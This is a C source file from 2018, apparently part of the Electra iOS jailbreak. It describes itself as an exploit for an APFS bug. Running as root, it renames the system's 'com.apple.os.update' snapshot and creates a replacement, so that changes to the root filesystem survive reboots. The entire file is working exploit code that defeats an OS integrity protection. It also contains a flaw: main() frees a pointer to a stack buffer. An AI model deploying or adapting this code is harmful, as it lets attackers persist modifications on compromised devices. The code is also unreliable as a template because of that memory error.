// An exploit written for an apfs bug found by @umanghere, by @Pwn20wnd
// Make your changes to the rootfs (Requires an additional exploit), spawn this
// with root privs and your changes will become persistent across reboots
// Thanks to snapUtil by Adam Leventhal (@ahl) for the do_* methods
// Thanks to Electra by CoolStar (@coolstarorg) for the check_snapshot method
// Copyright (c) 2018 Pwn20wnd
// Copyright (c) 2018 ur0

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/snapshot.h>
#include <unistd.h>

int find_rootfd(void) {
    int dirfd = open("/", O_RDONLY, 0);
    if (dirfd < 0) {
        perror("open");
        exit(1);
    }
    return dirfd;
}

int do_create(const char *snap) {
    int rootfd = find_rootfd();
    
    int ret = fs_snapshot_create(rootfd, snap, 0);
    if (ret != 0)
        perror("fs_snapshot_create");
    return (ret);
}

int do_delete(const char *snap) {
    int rootfd = find_rootfd();
    
    int ret = fs_snapshot_delete(rootfd, snap, 0);
    if (ret != 0)
        perror("fs_snapshot_delete");
    return (ret);
}

int do_rename(const char *snap, const char *nw) {
    int rootfd = find_rootfd();
    
    int ret = fs_snapshot_rename(rootfd, snap, nw, 0);
    if (ret != 0)
        perror("fs_snapshot_rename");
    return (ret);
}

int check_snapshot(const char *snap) {
    int rootfd = find_rootfd();
    
    struct attrlist alist = {0};
    char abuf[2048];
    
    alist.commonattr = ATTR_BULK_REQUIRED;
    
    int count = fs_snapshot_list(rootfd, &alist, &abuf[0], sizeof(abuf), 0);
    if (count < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    char *p = &abuf[0];
    for (int i = 0; i < count; i++) {
        char *field = p;
        uint32_t len = *(uint32_t *)field;
        field += sizeof(uint32_t);
        attribute_set_t attrs = *(attribute_set_t *)field;
        field += sizeof(attribute_set_t);
        
        if (attrs.commonattr & ATTR_CMN_NAME) {
            attrreference_t ar = *(attrreference_t *)field;
            const char *name = field + ar.attr_dataoffset;
            field += sizeof(attrreference_t);
            
            if (strcmp(name, snap) == 0) {
                return 1;
            }
        }
        
        p += len;
    }
    
    return 0;
}

char *find_system_snapshot(void) {
    int rootfd = find_rootfd();
    
    struct attrlist alist = {0};
    char abuf[2048];
    
    alist.commonattr = ATTR_BULK_REQUIRED;
    
    int count = fs_snapshot_list(rootfd, &alist, &abuf[0], sizeof(abuf), 0);
    if (count < 0) {
        perror("fs_snapshot_list");
        return NULL;
    }
    
    char *p = &abuf[0];
    for (int i = 0; i < count; i++) {
        char *field = p;
        uint32_t len = *(uint32_t *)field;
        field += sizeof(uint32_t);
        attribute_set_t attrs = *(attribute_set_t *)field;
        field += sizeof(attribute_set_t);
        
        if (attrs.commonattr & ATTR_CMN_NAME) {
            attrreference_t ar = *(attrreference_t *)field;
            const char *name = field + ar.attr_dataoffset;
            field += sizeof(attrreference_t);
            
            if (strstr(name, "com.apple.os.update-")) {
                return strdup(name);
            }
        }
        
        p += len;
    }
    return NULL;
}

void clean_tmp_snapshots(void) {
    int rootfd = find_rootfd();
    
    struct attrlist alist = {0};
    char abuf[2048];
    
    alist.commonattr = ATTR_BULK_REQUIRED;
    
    int count = fs_snapshot_list(rootfd, &alist, &abuf[0], sizeof(abuf), 0);
    if (count < 0) {
        perror("fs_snapshot_list");
        return;
    }
    
    char *p = &abuf[0];
    for (int i = 0; i < count; i++) {
        char *field = p;
        uint32_t len = *(uint32_t *)field;
        field += sizeof(uint32_t);
        attribute_set_t attrs = *(attribute_set_t *)field;
        field += sizeof(attribute_set_t);
        
        if (attrs.commonattr & ATTR_CMN_NAME) {
            attrreference_t ar = *(attrreference_t *)field;
            const char *name = field + ar.attr_dataoffset;
            field += sizeof(attrreference_t);
            
            if (strstr(name, "electra-tmp-snapshot-")) {
                do_delete(name);
            }
        }
        
        p += len;
    }
}

int main(int argc, char **argv) {
    int ret = -1;
    
    char *system_snapshot = find_system_snapshot();
    
    const char *nw = strdup("electra-system-snapshot");
    
    if (check_snapshot(nw) == 1) {
        char name[256];
        sprintf(name, "electra-tmp-snapshot-%lu", time(NULL));
        char *p = &name[0];
        nw = strdup(p);
        free(p);
        ret = do_rename(system_snapshot, nw);
        if (ret) {
            return -2;
        }
    } else {
        ret = do_rename(system_snapshot, nw);
        if (ret) {
            return -3;
        }
    }
    
    ret = do_create(system_snapshot);
    
    if (ret) {
        return -4;
    }
    
    clean_tmp_snapshots();
    
    free(system_snapshot);
    
    return 0;
}
